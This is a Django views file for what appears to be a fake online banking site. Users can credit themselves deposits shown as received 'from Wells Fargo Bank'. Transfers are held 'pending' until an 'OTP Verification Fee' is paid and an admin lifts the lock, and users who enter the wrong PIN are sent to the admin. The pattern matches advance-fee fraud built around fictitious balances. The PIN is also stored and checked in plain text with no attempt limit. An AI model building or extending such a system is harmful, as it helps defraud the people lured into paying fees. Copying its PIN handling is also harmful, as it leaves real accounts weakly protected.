from django.contrib.auth import authenticate
from django.contrib.auth import login
from django.shortcuts import render
from django.shortcuts import redirect
from django.contrib.auth.decorators import login_required
from .models import Deposit
from decimal import Decimal
from .models import SiteSettings
from .models import VerificationPayment
from .models import Transfer
from django.http import JsonResponse


def signon(request):

    if request.method == "POST":

        account_number = request.POST.get(
            "account_number"
        )

        password = request.POST.get(
            "password"
        )

        user = authenticate(
            request,
            username=account_number,
            password=password
        )

        if user:
            login(request, user)
            profile = user.userprofile

            profile.pin_verified = False
            profile.save()

            return redirect('verify_pin')

    return render(
        request,
        'signon.html'
    )
    

@login_required
def dashboard(request):

    profile = request.user.userprofile

    # 🔒 BLOCK ACCESS IF PIN NOT VERIFIED
    if not profile.pin_verified:
        return redirect('verify_pin')

    deposits = Deposit.objects.filter(
        user=request.user
    ).order_by("-created_at")

    verification_payments = VerificationPayment.objects.filter(
        user=request.user
    ).order_by("-created_at")

    transfers = Transfer.objects.filter(
        user=request.user
    ).order_by("-created_at")

    # Build one combined, clearly-labeled transaction history
    transactions = []

    for d in deposits:
        transactions.append({
            "type": "Deposit",
            "icon": "fa-building-columns",
            "direction": "in",
            "amount": d.amount,
            "status": d.status,
            "created_at": d.created_at,
            "message": (
                f"You received {profile.currency_symbol}{d.amount} from Wells Fargo Bank"
                if d.status == "successful" else None
            ),
        })

    for v in verification_payments:
        transactions.append({
            "type": "OTP Verification Fee",
            "icon": "fa-lock",
            "direction": "out",
            "amount": v.amount,
            "status": v.status,
            "created_at": v.created_at,
            "message": None,
        })

    for t in transfers:
        transactions.append({
            "type": "Transfer",
            "icon": "fa-paper-plane",
            "direction": "out",
            "amount": t.amount,
            "status": t.status,
            "created_at": t.created_at,
            "message": (
                f"Sent to {t.account_name} - {t.bank_name}"
                if t.status == "successful" else None
            ),
        })

    transactions.sort(key=lambda t: t["created_at"], reverse=True)

    # ✅ ADD THIS (SITE SETTINGS)
    settings = SiteSettings.objects.first()

    return render(request, "dashboard.html", {
        "profile": profile,
        "deposits": deposits,
        "verification_payments": verification_payments,
        "transfers": transfers,
        "transactions": transactions,
        "settings": settings   # 👈 THIS IS WHAT YOU WERE ASKING FOR
    })
    
    
def home(request):
    return render(request, 'index.html')



    
    
@login_required
def edit_pin(request):

    profile = request.user.userprofile

    if request.method == "POST":

        pin = request.POST.get("pin")
        confirm_pin = request.POST.get("confirm_pin")

        if (
            len(pin) == 4 and
            pin.isdigit() and
            pin == confirm_pin
        ):

            profile.transaction_pin = pin
            profile.save()

            return redirect("dashboard")

    return render(
        request,
        "edit_pin.html"
    )
    
    
@login_required
def create_deposit(request):

    if request.method == "POST":

        amount = request.POST.get("amount")

        if amount and float(amount) > 0:

            profile = request.user.userprofile

            deposit = Deposit.objects.create(
                user=request.user,
                amount=Decimal(amount),
                status="pending"
            )

            # if the account has already been verified (OTP fee approved),
            # deposits go straight through instead of waiting on admin
            if not profile.transfer_locked:
                deposit.status = "successful"
                deposit.save()  # triggers the balance-crediting signal

    return redirect("dashboard")


@login_required
def pay_verification_fee(request):

    if request.method == "POST":

        profile = request.user.userprofile

        VerificationPayment.objects.create(
            user=request.user,
            amount=profile.verification_fee,
            status="pending"
        )

    return redirect("dashboard")


@login_required
def create_transfer(request):

    if request.method == "POST":

        bank_name = request.POST.get("bank_name")
        account_number = request.POST.get("account_number")
        account_name = request.POST.get("account_name")
        amount = request.POST.get("amount")

        if bank_name and account_number and account_name and amount and float(amount) > 0:

            profile = request.user.userprofile

            transfer = Transfer.objects.create(
                user=request.user,
                bank_name=bank_name,
                account_number=account_number,
                account_name=account_name,
                amount=Decimal(amount),
                status="pending"
            )

            # if the account has already been verified (OTP fee approved),
            # transfers go straight through instead of waiting on admin
            if not profile.transfer_locked:
                transfer.status = "successful"
                transfer.save()  # triggers the balance-debiting signal

            return JsonResponse({"ok": True, "status": transfer.status})

        return JsonResponse({"ok": False, "error": "Missing or invalid fields"}, status=400)

    return JsonResponse({"ok": False}, status=405)


@login_required
def verify_pin(request):

    profile = request.user.userprofile

    if request.method == "POST":

        pin = request.POST.get("pin")

        if pin == profile.transaction_pin:
            profile.pin_verified = True
            profile.save()
            return redirect("dashboard")

        return render(request, "verify_pin.html", {
            "error": "Wrong PIN. Contact Admin for correct PIN."
        })

    return render(request, "verify_pin.html")